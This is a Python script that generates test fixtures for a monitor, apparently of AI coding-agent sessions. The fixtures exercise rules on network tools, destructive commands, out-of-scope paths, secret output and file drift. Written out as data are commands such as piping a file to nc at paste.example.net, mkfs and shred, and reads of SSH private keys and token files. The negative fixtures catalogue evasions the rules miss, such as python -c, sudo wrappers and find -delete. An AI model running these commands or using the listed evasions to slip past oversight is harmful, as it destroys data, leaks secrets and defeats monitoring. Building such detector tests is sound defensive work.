"""Generate tests/fixtures/rules/** in the shape raqib/hooks/capture.py writes.

Run from the repository root: python3 tests/fixtures/rules/generate.py
"""
import datetime, hashlib, importlib.util, json, os, sys
# M4.2: Bash lines with command_programs are made by capture itself, from the command.
_spec = importlib.util.spec_from_file_location("raqib_capture_for_fixtures", os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "raqib", "hooks", "capture.py"))
CAPTURE = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(CAPTURE)
T0 = datetime.datetime(2026, 10, 16, 13, 0, 0, tzinfo=datetime.timezone.utc)
CWD = "/work/example"
R = "tests/fixtures/rules/"
KEYS = ["ts", "seq", "session_id", "phase", "tool", "tool_use_id", "input_sha256", "input_meta",
        "output_sha256", "output_meta", "ok", "error_class", "cwd", "source"]

def ts(sec):
    return (T0 + datetime.timedelta(seconds=sec)).isoformat(timespec="milliseconds").replace("+00:00", "Z")

def h(*x):
    return hashlib.sha256(json.dumps(x, sort_keys=True).encode()).hexdigest()

class S:
    def __init__(self, sid, cwd=CWD):
        self.sid, self.seq, self.t, self.lines, self.cwd = sid, 0, 0, [], cwd
    def event(self, phase):
        self.seq += 1; self.t += 1
        self.lines.append({"ts": ts(self.t), "seq": self.seq, "session_id": self.sid, "phase": phase,
                           "tool": "-", "cwd": self.cwd})
        return self.seq
    def call(self, tool, meta, ok=True, kinds=(), error_class=None, post=True):
        self.seq += 1
        base = {"seq": self.seq, "session_id": self.sid, "tool": tool,
                "tool_use_id": "toolu_%s_%d" % (self.sid[-8:], self.seq),
                "input_sha256": h(self.sid, self.seq, tool, meta), "input_meta": meta}
        self.t += 1
        self.lines.append(dict(base, ts=ts(self.t), phase="pre", cwd=self.cwd))
        if post:
            self.t += 2
            rec = dict(base, ts=ts(self.t), phase="post", output_sha256=h("out", self.sid, self.seq),
                       output_meta={"scan": "full", "secret_kinds": sorted(kinds)}, ok=ok, cwd=self.cwd)
            if error_class:
                rec["error_class"] = error_class
            self.lines.append(rec)
        return self.seq
    def bash(self, head, **kw):
        return self.call("Bash", {"command_head": head}, **kw)
    def command(self, command, **kw):
        """A Bash call as M4.2 capture records it: command_head and command_programs."""
        return self.call("Bash", CAPTURE.input_meta("Bash", {"command": command}), **kw)
    def os_line(self, phase, tool, meta):
        """M5.3 ruling D-11: one line of the os source, in os-sysmon's shape, so the
        `source != os` guard of NET-TOOL and SECRET-OUTPUT is measured."""
        self.t += 1
        rec = {"ts": ts(self.t), "seq": 1, "session_id": "os-4100", "phase": phase, "tool": tool,
               "input_sha256": h("os", tool, meta), "input_meta": meta, "cwd": self.cwd, "source": "os"}
        if phase == "post":
            rec.update(output_meta={}, ok=True)
        self.lines.append(rec)

def dump(lines):
    return ",\n".join("  " + json.dumps({k: r[k] for k in KEYS if k in r}, separators=(", ", ": ")) for r in lines)

def write(path, lines, context=None, expect=None):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if context is None and expect is None:
        text = "[\n" + dump(lines) + "\n]\n"
    else:
        head = []
        if context is not None:
            head.append('"context": ' + json.dumps(context))
        if expect is not None:
            head.append('"expect_seq": ' + json.dumps(expect))
        text = "{" + ", ".join(head) + ',\n "lines": [\n' + dump(lines) + "\n]}\n"
    open(path, "w", newline="\n").write(text)  # LF on every platform (M5.1)
    print("wrote", path, len(lines))

# NET-TOOL
s = S("fixture-rules-net-1"); s.bash("ls"); n = s.bash("curl"); write(R + "NET-TOOL/positive-curl.json", s.lines, expect=[n])
s = S("fixture-rules-net-2"); n = s.call("WebFetch", {"url_host": "paste.example.net"}); write(R + "NET-TOOL/positive-webfetch.json", s.lines, expect=[n])
# M4.2 REDO-2 (E-7): benign Bash lines are written by capture, so they carry command_programs.
s = S("fixture-rules-net-3"); s.command("git log --oneline -3"); s.call("Read", {"path": CWD + "/curl.txt"}); s.command("curlie-not-a-net-tool --help"); s.call("Edit", {"path": CWD + "/net.py"})
s.os_line("pre", "net", {"dest_port": 443, "dest_private": False})
write(R + "NET-TOOL/negative-local.json", s.lines)
# M4.2 E2: a network program anywhere in the command (command_programs).
s = S("fixture-rules-net-4"); s.command("ls -la"); seqs = [s.command(c) for c in (
    "cd build && curl -sI https://example.com", "cat notes.txt | nc paste.example.net 9999",
    "bash -c 'wget -q https://example.com/x'", "echo $(curl -s https://example.com/ip)")]
write(R + "NET-TOOL/positive-programs.json", s.lines, expect=seqs)
# The evasions that stay (D-4: python -c code is an argument; wrappers; programs not on the list).
s = S("fixture-rules-net-5")
for c in ("python3 -c 'import urllib.request'", "git fetch origin", "sudo curl https://example.com",
          "echo curl | cat", "pip install requests"):
    s.command(c)
write(R + "NET-TOOL/negative-programs.json", s.lines)
# DESTRUCT-CMD
s = S("fixture-rules-destruct-1"); s.bash("ls"); n = s.bash("rm"); write(R + "DESTRUCT-CMD/positive-rm.json", s.lines, expect=[n])
s = S("fixture-rules-destruct-2"); n = s.bash("mkfs.ext4"); write(R + "DESTRUCT-CMD/positive-mkfs.json", s.lines, expect=[n])
s = S("fixture-rules-destruct-3"); s.command("rmate notes.txt"); s.command("ddgr python"); s.call("Write", {"path": CWD + "/rm.sh"}); s.command("git status")
write(R + "DESTRUCT-CMD/negative-safe.json", s.lines)
# M4.2 E2: a destructive program anywhere in the command (command_programs).
s = S("fixture-rules-destruct-4"); s.command("ls -la"); seqs = [s.command(c) for c in (
    "cd build && rm -rf out", "ls;shred -u old.key", "bash -c 'mkfs.ext4 /dev/sdz1'",
    "git status | dd of=/dev/null")]
write(R + "DESTRUCT-CMD/positive-programs.json", s.lines, expect=seqs)
# The evasions that stay: python -c code, a wrapper, find -delete, git clean, rm as an argument.
s = S("fixture-rules-destruct-5")
for c in ("python3 -c 'import os; os.remove(\"x\")'", "sudo rm -rf build", "find . -name '*.pyc' -delete",
          "git clean -fdx", "echo rm | cat", "rmate notes.txt; ddgr python"):
    s.command(c)
write(R + "DESTRUCT-CMD/negative-programs.json", s.lines)
# SCOPE-PATH
s = S("fixture-rules-scope-1"); n = s.call("Read", {"path": "~/.ssh/id_ed25519"}); write(R + "SCOPE-PATH/positive-ssh-key.json", s.lines, expect=[n])
s = S("fixture-rules-scope-2"); a = s.call("Edit", {"path": "/etc/hosts"}); b = s.call("Write", {"path": "../other-project/notes.md"})
write(R + "SCOPE-PATH/positive-etc-and-dotdot.json", s.lines, expect=[a, b])
s = S("fixture-rules-scope-3"); n = s.call("Read", {"path": "/work/example-secrets/token.txt"}); write(R + "SCOPE-PATH/positive-sibling-prefix.json", s.lines, expect=[n])
s = S("fixture-rules-scope-4"); s.call("Read", {"path": CWD + "/src/app.py"}); s.call("Edit", {"path": "src/app.py"})
s.call("Glob", {"path": CWD}); s.call("Grep", {}); s.call("Read", {"path": CWD + "/src/../README.md"}); s.bash("cat")
write(R + "SCOPE-PATH/negative-inside.json", s.lines)
# SECRET-OUTPUT
s = S("fixture-rules-secret-1"); n = s.bash("cat", kinds=["aws_access_key_id"]); write(R + "SECRET-OUTPUT/positive-aws-key-in-cat.json", s.lines, expect=[n])
s = S("fixture-rules-secret-2"); n = s.bash("curl", ok=False, kinds=["github_token", "jwt"], error_class="failure")
write(R + "SECRET-OUTPUT/positive-failure-message.json", s.lines, expect=[n])
s = S("fixture-rules-secret-3"); s.bash("cat"); s.call("Read", {"path": CWD + "/.env.example"})
s.os_line("post", "process", {"command_head": "cat.exe", "command_programs": ["cat.exe"], "depth": 2})
write(R + "SECRET-OUTPUT/negative-clean-output.json", s.lines)
# DRIFT-FILES
scope = {"scope": ["src", "tests/test_app.py", "docs/review"]}
s = S("fixture-rules-drift-1"); seqs = []
for p in ["src/a.py", "README.md", "setup.cfg", "src/b.py", "tools/gate.sh", "./README.md"]:
    seqs.append(s.call("Edit", {"path": p if p.startswith("./") else CWD + "/" + p}))
write(R + "DRIFT-FILES/positive-three-files.json", s.lines, scope, expect=[seqs[1], seqs[2], seqs[4], seqs[5]])
s = S("fixture-rules-drift-2")
for p in ["src/a.py", "src/pkg/b.py", "tests/test_app.py", "docs/review/q.md", "src/a.py"]:
    s.call("Write" if p.endswith(".md") else "Edit", {"path": CWD + "/" + p})
s.call("Read", {"path": CWD + "/README.md"}); s.call("Read", {"path": CWD + "/setup.cfg"}); s.call("Read", {"path": CWD + "/tools/gate.sh"})
write(R + "DRIFT-FILES/negative-in-scope.json", s.lines, scope)
s = S("fixture-rules-drift-3")
for p in ["README.md", "setup.cfg", "/work/example/x/../README.md", "src/a.py"]:
    s.call("Edit", {"path": p if p.startswith("/") else CWD + "/" + p})
s.call("Edit", {"path": CWD + "/tools/gate.sh"}, ok=False)
s.call("Edit", {"path": CWD + "/Makefile"}, post=False)
write(R + "DRIFT-FILES/negative-two-files.json", s.lines, scope)
# SCOPE-CWD-ROOT
a = S("fixture-rules-cwdroot-1", cwd="/"); first_a = a.event("session_start"); a.bash("ls")
b = S("fixture-rules-cwdroot-2", cwd="/home/alice"); first_b = b.call("Read", {"path": "/home/alice/notes.txt"})
more = []
for i, cwd in enumerate(["/root", "/Users/bob", "/tmp", "/home/carol/.", "/mnt/c/Users/dan", "/var/root"], start=5):
    m = S("fixture-rules-cwdroot-%d" % i, cwd=cwd); m.event("session_start"); m.bash("ls"); more += m.lines
# Every other alternative of the rule's regex, so none can be dropped unseen (M-REV).
for i, cwd in enumerate(["/home", "/USERS", "/mnt", "/media", "/srv", "/opt", "/var/tmp", "/mnt/d"], start=13):
    m = S("fixture-rules-cwdroot-%d" % i, cwd=cwd); m.event("session_start"); m.bash("ls"); more += m.lines
write(R + "SCOPE-CWD-ROOT/positive-root-and-home.json", a.lines + b.lines + more)
a = S("fixture-rules-cwdroot-3", cwd="/home/alice/project"); a.event("session_start"); a.bash("ls")
b = S("fixture-rules-cwdroot-4"); b.call("Read", {"path": CWD + "/a.py"})
c = S("fixture-rules-cwdroot-11", cwd="/tmp/build-123"); c.event("session_start"); c.bash("make")
d = S("fixture-rules-cwdroot-12", cwd="/opt/app"); d.event("session_start"); d.bash("ls")
write(R + "SCOPE-CWD-ROOT/negative-project-dir.json", a.lines + b.lines + c.lines + d.lines)
# SCOPE-CWD-MOVED
s = S("fixture-rules-cwdmoved-1"); first = s.event("session_start"); s.bash("ls"); s.cwd = "/tmp"; moved = s.bash("cat"); s.cwd = "/tmp/"; s.bash("ls")
write(R + "SCOPE-CWD-MOVED/positive-cd-out.json", s.lines, expect=[first, moved])
s = S("fixture-rules-cwdmoved-2"); s.event("session_start"); s.bash("ls"); s.call("Read", {"path": CWD + "/a.py"}); s.event("stop")
write(R + "SCOPE-CWD-MOVED/negative-steady.json", s.lines)
# M5.1b: Windows paths (rulings 2026-11-02 Q-4..Q-6, 2026-11-03 C-1, C-2, C-9). W is a
# Windows cwd; C:\proj, c:/PROJ, C:\proj\ and \\?\C:\proj are one directory.
W = "C:\\proj"
UNC = "\\\\srv\\share\\proj"
# SCOPE-PATH
s = S("fixture-rules-scope-win-1", cwd=W)
seqs = [s.call(tool, {"path": p}) for tool, p in [
    ("Read", "C:\\Users\\alice\\.ssh\\id_rsa"), ("Edit", "D:\\proj\\notes.md"), ("Write", "..\\other-project\\notes.md"),
    ("Read", "\\\\srv\\share\\secrets.txt"), ("Read", "C:\\proj-secrets\\token.txt"), ("Read", "/etc/hosts"),
    ("Grep", "c:/PROJ/../other"), ("Read", "\\\\.\\pipe\\secrets"),  # C-9: \\.\pipe keeps its prefix
    ("Read", "~\\.ssh\\id_rsa")]]  # C-13: a ~ path is POSIX, outside a Windows cwd
k = S("fixture-rules-scope-win-5", cwd="C:\\work")  # C-11: KELVIN SIGN is not folded to k
k.call("Read", {"path": "C:\\WOR\u212a\\secrets.txt"})  # its seq 1 is cited per session in tests/test_rules.py
write(R + "SCOPE-PATH/positive-windows.json", s.lines + k.lines, expect=seqs)
s = S("fixture-rules-scope-win-2", cwd=W); n = s.call("Read", {"path": "/c/proj/src/app.py"})  # C-2: Git Bash form, a known FP
write(R + "SCOPE-PATH/positive-windows-git-bash-form.json", s.lines, expect=[n])
s = S("fixture-rules-scope-win-3", cwd=W)
for tool, p in [("Read", "C:\\proj\\src\\app.py"), ("Edit", "src\\app.py"), ("Read", "c:/PROJ/README.md"),
                ("Glob", "C:\\proj"), ("Read", "C:\\proj\\src\\..\\README.md"), ("Write", "C:/Proj/docs/notes.md"),
                ("Read", "\\\\?\\C:\\proj\\src\\app.py")]:  # C-9
    s.call(tool, {"path": p})
u = S("fixture-rules-scope-win-4", cwd=UNC); u.call("Read", {"path": "\\\\SRV\\Share\\proj\\a.py"}); u.call("Edit", {"path": "b.py"})
u.call("Read", {"path": "\\\\?\\UNC\\srv\\share\\proj\\c.py"})  # C-9
write(R + "SCOPE-PATH/negative-windows.json", s.lines + u.lines)
# SCOPE-CWD-MOVED
s = S("fixture-rules-cwdmoved-win-1", cwd=W); first = s.event("session_start"); s.bash("dir"); s.cwd = "D:\\proj"; moved = s.bash("dir")
t = S("fixture-rules-cwdmoved-win-2", cwd="/mnt/c/proj"); t.event("session_start"); t.cwd = W; t.bash("dir")  # Q-6: two cwds
write(R + "SCOPE-CWD-MOVED/positive-windows.json", s.lines + t.lines, expect=[first, moved])
s = S("fixture-rules-cwdmoved-win-3", cwd=W); s.event("session_start"); s.bash("dir"); s.cwd = "c:/PROJ"
s.call("Read", {"path": "src\\a.py"}); s.cwd = "\\\\?\\C:\\proj"; s.bash("dir")  # C-9
s.cwd = "C:\\proj\\"; s.event("stop")
u = S("fixture-rules-cwdmoved-win-4", cwd=UNC); u.event("session_start"); u.cwd = "\\\\SRV\\Share\\proj\\."; u.bash("dir")
write(R + "SCOPE-CWD-MOVED/negative-windows.json", s.lines + u.lines)
# SCOPE-CWD-ROOT: every alternative of the Windows branch (C-1), so none can be dropped unseen.
more = []
for i, cwd in enumerate(["C:\\", "c:/", "D:\\.", "C:\\Users", "C:\\Users\\alice", "c:/users/bob/", "C:\\Windows",
                         "C:\\WINDOWS\\Temp", "E:\\Temp\\", "C:\\Program Files", "C:\\Program Files (x86)",
                         "C:\\ProgramData", "C:\\Users\\alice\\AppData\\Local\\Temp", "\\\\srv\\share",
                         "\\\\SRV\\Share\\.", "\\\\?\\C:\\Users\\alice", "\\\\?\\UNC\\srv\\share"], start=1):  # C-9
    m = S("fixture-rules-cwdroot-win-%d" % i, cwd=cwd); m.event("session_start"); m.bash("dir"); more += m.lines
write(R + "SCOPE-CWD-ROOT/positive-windows-roots.json", more)
more = []
for i, cwd in enumerate(["C:\\proj", "C:\\Users\\alice\\proj", "C:\\Windows\\System32", "C:\\Temp\\build-123",
                         "C:\\Program Files\\App", "C:\\ProgramData\\App", "C:\\Users\\alice\\AppData\\Local\\Temp\\build",
                         UNC, "\\\\?\\C:\\proj"], start=18):
    m = S("fixture-rules-cwdroot-win-%d" % i, cwd=cwd); m.event("session_start"); m.bash("dir"); more += m.lines
write(R + "SCOPE-CWD-ROOT/negative-windows-project-dirs.json", more)
# DRIFT-FILES: a Windows context root (E2), entries with \ or /, paths in any case.
s = S("fixture-rules-drift-win-1", cwd=W); seqs = []
for p in ["C:\\proj\\src\\a.py", "C:\\proj\\README.md", "setup.cfg", "C:\\PROJ\\SRC\\b.py", "tools\\gate.sh",
          "c:/proj/./README.md", "C:\\proj\\tests\\test_app.py"]:
    seqs.append(s.call("Edit", {"path": p}))
write(R + "DRIFT-FILES/positive-windows.json", s.lines, {"scope": ["src", "tests\\test_app.py", "docs/review"], "root": W},
      expect=[seqs[1], seqs[2], seqs[4], seqs[5]])
s = S("fixture-rules-drift-win-2", cwd=W)
for p in ["C:\\proj\\src\\a.py", "src\\pkg\\b.py", "C:/Proj/Tests/Test_App.py", "c:\\proj\\docs\\review\\q.md",
          "C:\\proj\\README.md", "setup.cfg", "\\\\?\\C:\\proj\\src\\c.py"]:  # C-9: inside src
    s.call("Edit", {"path": p})
s.call("Edit", {"path": "C:\\proj\\tools\\gate.sh"}, ok=False); s.call("Read", {"path": "C:\\proj\\Makefile"})
write(R + "DRIFT-FILES/negative-windows.json", s.lines, {"scope": ["src", "tests\\test_app.py", "docs/review"], "root": "c:/PROJ/"})
# benign corpus: realistic sessions; some are expected to trip rules (A6 budgets)
s = S("fixture-benign-dev"); s.event("session_start")
for tool, meta in [("Glob", {"path": CWD}), ("Read", {"path": CWD + "/src/app.py"}), ("Grep", {"path": CWD + "/src"}),
                   ("Edit", {"path": CWD + "/src/app.py"}), ("Write", {"path": CWD + "/tests/test_app.py"})]:
    s.call(tool, meta)
for command in ("python3 -m pip list", "git status", "git diff --stat", "ls -la", "pytest -q"):
    s.command(command)
s.event("stop")
write(R + "benign/dev-session.json", s.lines)
s = S("fixture-benign-docs"); s.event("session_start"); s.call("Read", {"path": CWD + "/pyproject.toml"})
s.call("WebFetch", {"url_host": "docs.python.org"}); s.call("Edit", {"path": CWD + "/pyproject.toml"}); s.event("stop")
write(R + "benign/docs-lookup.json", s.lines)
s = S("fixture-benign-cleanup"); s.event("session_start"); s.command("make"); s.command("rm -rf build"); s.command("make test"); s.event("stop")
write(R + "benign/build-cleanup.json", s.lines)
s = S("fixture-benign-scoped"); s.event("session_start")
for p in ["src/app.py", "tests/test_app.py", "src/util.py"]:
    s.call("Read", {"path": CWD + "/" + p}); s.call("Edit", {"path": CWD + "/" + p})
s.command("pytest -q tests"); s.command("git diff --stat"); s.event("stop")
write(R + "benign/scoped-task-session.json", s.lines, {"scope": ["src", "tests"]})
